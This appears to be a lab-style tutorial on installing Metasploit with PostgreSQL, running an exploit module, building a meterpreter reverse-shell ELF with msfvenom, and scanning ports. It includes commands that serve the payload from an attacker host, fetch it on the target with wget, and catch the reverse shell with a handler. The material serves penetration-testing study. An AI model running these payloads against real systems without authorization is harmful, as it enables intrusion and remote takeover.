### Part 1: Setup Metasploit Locally with PostgreSQL

## Set up Metasploit with PostgreSQL to manage data efficiently.

# 1 - Install PostgreSQL: Install PostgreSQL and its dependencies on your Ubuntu system.

sudo apt update
sudo apt install -y postgresql

# 2 - Start PostgreSQL Service: Start the PostgreSQL service to ensure the database is operational.

sudo systemctl start postgresql
sudo systemctl enable postgresql

# 3 - Create PostgreSQL User: Create a dedicated PostgreSQL user specifically for Metasploit.

sudo -u postgres createuser meta_user -P

# 4 - Create PostgreSQL Database: Set up a PostgreSQL database that Metasploit will use to store its data.

sudo -u postgres createdb -O meta_user meta_db

# 5 - Initialize Metasploit Database: Initialize the Metasploit database to prepare it for use.

msfdb init

# 6 - Verify Database Connection: Start the Metasploit console and verify the connection to the PostgreSQL database.

msfconsole

# msf > db_status

#----------------------------------------------#

### Part 2: Basic Usage of Metasploit

## Familiarize yourself with basic commands in Metasploit for exploiting vulnerabilities.

# 1 - Start the Metasploit Console: Access the Metasploit console to begin interacting with its features.

msfconsole

# 2 - Search for Exploits: Learn how to search for available exploits within Metasploit’s extensive database (example with linux).

# msf > search name:linux type:exploit

# 3 - Select an Exploit: Choose a specific exploit from the search results to prepare for exploitation.

# msf > use exploit(linux/http/op5_config_exec)

# 4 - Set Exploit Options: Configure the necessary options for the selected exploit before execution.

# msf exploit(linux/http/op5_config_exec) > set SRVHOST 127.0.0.1
# msf exploit(linux/http/op5_config_exec) > set RHOSTS remote_host

# 5 - Set Payload: Define the payload that will be delivered to the target system during exploitation.

# msf exploit(linux/http/op5_config_exec) > set PAYLOAD linux/x86/meterpreter/reverse_tcp

# 6 - Set Local Host and Port: Specify the local host and port where Metasploit will listen for incoming connections.

# msf exploit(linux/http/op5_config_exec) > set LHOST local_ip
# msf exploit(linux/http/op5_config_exec) > set LPORT 4444

# 7 - Run the Exploit: Execute the configured exploit to attempt exploitation on the target system.

# msf exploit(linux/http/op5_config_exec) > exploit
# msf > notes -a -t exploit -n "Using exploit/linux/http/op5_config_exec with payload linux/x86/meterpreter/reverse_tcp" local_ip

#----------------------------------------------#

### Part 3: Create and Use a Simple Payload

## Understand how to create and deploy a payload using Metasploit.

# 1 - Generate a Payload: Use Metasploit’s msfvenom tool to create a custom payload with specific characteristics (payload type, local host, local port, output format, and output file name. payload.elf).

## msf > msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=local_host LPORT=4444 -f elf -o payload.elf

# 2 - Make payload.elf executable

chmod +x payload.elf

# 3 - Execute the Payload: Validate the generated payload and understand how it can be executed on Ubuntu systems (on target machine).

## We need to create a connection in order to move the payload to the target and execute it.

python3 -m http.server 8080 # on attacker machine

wget http://<ATTACKER-IP>:8080/payload.elf # on target machine

## Now we have to start a handler on the attacker machine

# msf > use exploit multi/handler
# msf > set PAYLOAD linux/x86/meterpreter/reverse_tcp
# msf > set LHOST <attacker_ip>
# msf > LPORT 4444
# msf > run

## Finally, we can run the payload on the target machine

./payload.elf

## And document it

# msf > notes -a -t result -n "Payload executed successfully: Meterpreter session opened via payload.elf" <target-IP>
# msf > loot -a -t binary -f ./payload.elf -i "Generated payload ELF for reverse shell" <target-IP>

#----------------------------------------------#

### Part 4: Explore Auxiliary Modules

## Learn about auxiliary modules in Metasploit for performing additional tasks during penetration testing.

# 1 - Start the Metasploit Console: Access the Metasploit console to begin exploring auxiliary modules.

msfconsole

# 2 - Search for Auxiliary Modules: Discover and explore available auxiliary modules designed for various tasks.

# msf > search type:auxiliary

# 3 - Select an Auxiliary Module: Choose a specific auxiliary module, such as auxiliary/scanner/portscan/tcp, for scanning purposes.

# msf > use auxiliary/scanner/portscan/tcp

# 4 - Configure Module Options: Set the required options for the selected auxiliary module, such as specifying the target hosts (RHOSTS).

# msf auxiliary(scanner/portscan/tcp) > set RHOSTS <target_host>

# 5 - Execute the Module: Run the configured auxiliary module to perform its designated task, such as conducting a TCP port scan.

# msf auxiliary(scanner/portscan/tcp) > run

# 6 - Document findings

# msf auxiliary(scanner/portscan/tcp) > notes -a -t scan -n "TCP scan found 5 open ports" <target_host>

# msf > notes -o notes.csv
